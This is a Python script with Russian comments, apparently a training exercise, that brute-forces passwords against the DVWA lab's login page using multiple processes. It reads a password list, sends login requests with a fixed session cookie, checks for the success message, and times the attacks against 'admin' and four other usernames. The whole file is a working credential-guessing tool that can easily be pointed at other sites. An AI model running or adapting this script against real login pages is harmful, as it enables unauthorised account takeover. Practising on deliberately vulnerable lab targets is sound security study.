import requests # библиотека для посылания запросов на сайт.
import time

import multiprocessing as mp #для создания потоков
from multiprocessing import Value # для создания переменной, к которой имеют доступ все потоки

passwords = [] # список паролей из файла passwords.txt
n_threads = 0 # количество потоков

# функция, проверяет правильность логина и пароля
def try_auth(login, password):
    cookies = dict(PHPSESSID='mo1h5j6d2oubedik8mq0bk56lg', security='low') # куки нужны для входа на страницу задания bruteforce (иначе выкинет)
    r = requests.get('http://dvwa.local/vulnerabilities/brute/', params={'username': login, 'password': password, 'Login': 'Login'}, # отправка запроса
     cookies=cookies)
    
    if r.text.find("Welcome to the password protected") != -1: # проверяем, что удалось войти.
        return True
    return False

def get_passw(idx): # получает пароль из списка
    return passwords[idx].strip() # удаляет пробелы в начале и конце

def bruteforce_thread(found, tid, login, start, end): # выполняет брутфорс
    for i in range(start, end):
        if found.value: # пароль уже был найден
            break
        password = get_passw(i) # получаем пароль с индексом i
        res = try_auth(login, password) # пробуем аутентифицироваться
        if res == True: # удалось найти пароль
            print(f'Found password for user {login}: {password} (Thread {tid})!') # выводим логин пользователя, найденный пароль и номер потока
            found.value = True # ставим, что пароль был найден
            break

def bruteforce(login): #функция(запускает потоки) которая производит перебор паролей и подставляет и замеряет время
    start_time = time.perf_counter()

    N = len(passwords) # количество паролей (строк в Файле passwords.txt)
    per_thread = N // n_threads #кол во паролей делем на кол во потоков, чтобы было поровну

    found = Value('b', False) # создаем переменную, в которой хранится найден ли пароль или еще нет. b - bool (False или True), False - изначальное значение
    threads = []
    start = 0 # с какого пароля начать
    for j in range(n_threads): # цикл по количеству потоков, в нем мы запускаем потоки
        end = start + per_thread # на каком пароле закончить
        t = mp.Process(target=bruteforce_thread, args=(found, j, login, start, end))
        threads.append(t)
        t.start()
        start = end #с какого пароля начинать и на каком заканчивать распределение между потоками поровно

    for thread in threads: # проходим по всем запущеным потокам и ждем завершения 
        thread.join()

    # как считаем время 
    # смотрим когда начали выполнение и потом когда закончили и затем вычитаем
    end_time = time.perf_counter() # возвращает время текущее
    elapsed = end_time - start_time
    print("Exec time: {}.".format(elapsed))


f = open("passwords.txt", "r") # открываем файл passwords.txt для чтения
passwords = f.readlines() # читаем все строки из этого файла и записываем в перменную passwords

n_threads = int(input("Threads count:")) # спрашиваем у пользователя количество потоков

bruteforce("admin") # выполняем брутфорс паролей у пользователя admin
bruteforce("133742")
bruteforce("gerruciy")
bruteforce("lemer")
bruteforce("zemleroy")
